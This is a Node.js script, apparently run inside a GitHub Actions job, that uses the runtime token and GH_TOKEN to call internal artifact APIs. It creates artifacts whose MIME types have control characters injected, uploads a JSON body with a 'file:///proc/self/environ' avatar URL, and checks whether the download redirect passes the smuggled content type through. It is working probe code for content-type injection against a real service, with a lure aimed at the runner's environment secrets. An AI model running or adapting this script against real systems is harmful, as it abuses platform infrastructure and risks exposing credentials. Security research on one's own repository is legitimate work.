import { createHash } from 'node:crypto';
import { BlobClient } from './node_modules/@azure/storage-blob/dist/index.js';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';

const token=process.env.ACTIONS_RUNTIME_TOKEN;
const ghToken=process.env.GH_TOKEN;
if(!token||!ghToken) throw new Error('Runtime credentials unavailable');
const ids=getBackendIdsFromToken();
const client=internalArtifactTwirpClient();
const repo=process.env.GITHUB_REPOSITORY;
const stamp=process.env.GITHUB_RUN_ID;
const candidates=[
  ['fs-prefix','\u001capplication/json'],['gs-prefix','\u001dapplication/json'],
  ['rs-prefix','\u001eapplication/json'],['us-prefix','\u001fapplication/json'],
  ['nel-prefix','\u0085application/json'],['fs-suffix','application/json\u001c'],
  ['gs-suffix','application/json\u001d'],['rs-suffix','application/json\u001e'],
  ['us-suffix','application/json\u001f'],['nel-suffix','application/json\u0085'],
  ['fs-parameter','\u001capplication/json; charset=utf-8'],
  ['us-parameter','\u001fapplication/json; charset=utf-8'],
  ['json-fs-parameter','application/json\u001c; charset=utf-8'],
  ['json-us-parameter','application/json\u001f; charset=utf-8'],
];
async function probe(label,mime){
  const name=`mime-control-${stamp}-${label}`;
  const created=await client.CreateArtifact({workflowRunBackendId:ids.workflowRunBackendId,workflowJobRunBackendId:ids.workflowJobRunBackendId,name,version:7,mimeType:StringValue.create({value:mime})});
  if(!created.ok||!created.signedUploadUrl) throw new Error('create rejected');
  const blob=new BlobClient(created.signedUploadUrl).getBlockBlobClient();
  const placeholder=Buffer.from('{"probe":"placeholder"}');
  await blob.uploadData(placeholder,{blobHTTPHeaders:{blobContentType:mime}});
  const digest=createHash('sha256').update(placeholder).digest('hex');
  const finalized=await client.FinalizeArtifact({workflowRunBackendId:ids.workflowRunBackendId,workflowJobRunBackendId:ids.workflowJobRunBackendId,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${digest}`})});
  if(!finalized.ok) throw new Error('finalize rejected');
  const id=String(finalized.artifactId);
  const body=Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${id}/zip`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'}}));
  await blob.uploadData(body,{blobHTTPHeaders:{blobContentType:mime}});
  const rest=await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,{redirect:'manual',headers:{authorization:`Bearer ${ghToken}`,accept:'application/vnd.github+json','user-agent':'repo-cassette-own-control-test'}});
  const location=rest.headers.get('location');
  if(!location) return {label,status:rest.status,error:'no redirect'};
  const signed= new URL(location);
  const raw=await fetch(location);
  const bytes=Buffer.from(await raw.arrayBuffer());
  return {label,status:rest.status,rsct:signed.searchParams.get('rsct'),rawType:raw.headers.get('content-type'),exact:bytes.equals(body),bytes:bytes.length};
}
const out=await Promise.allSettled(candidates.map(([label,mime])=>probe(label,mime)));
for(let i=0;i<out.length;i++) console.log(JSON.stringify(out[i].status==='fulfilled'?out[i].value:{label:candidates[i][0],error:String(out[i].reason?.message||out[i].reason).slice(0,180)}));
